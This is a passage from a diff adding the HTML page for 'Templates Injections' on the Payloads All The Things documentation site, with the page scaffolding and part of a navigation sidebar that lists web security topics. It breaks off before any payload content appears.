@@ -1,0 +1,5420 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.4.3">
+    
+    
+      
+        <title>Templates Injections - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.6b80c2a2.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#templates-injections" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Templates Injections
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Payloads All The Things [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="API Key Leaks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS Amazon Bucket S3" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Account Takeover" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CORS Misconfiguration" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CRLF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRLF%20Injection/" class="md-nav__link">
+        CRLF
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSRF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSV Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSV%20Injection/" class="md-nav__link">
+        CSV Injection (Formula Injection)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Exploits" data-md-level="1">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Command Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DNS Rebinding" data-md-level="1">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Dependency Confusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Directory Traversal" data-md-level="1">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Directory%20Traversal/" class="md-nav__link">
+        Directory traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="File Inclusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_19" type="checkbox" id="__nav_19" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="GraphQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_20" type="checkbox" id="__nav_20" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HTTP Parameter Pollution" data-md-level="1">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_21" type="checkbox" id="__nav_21" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Deserialization" data-md-level="1">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Object injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Ruby/" class="md-nav__link">
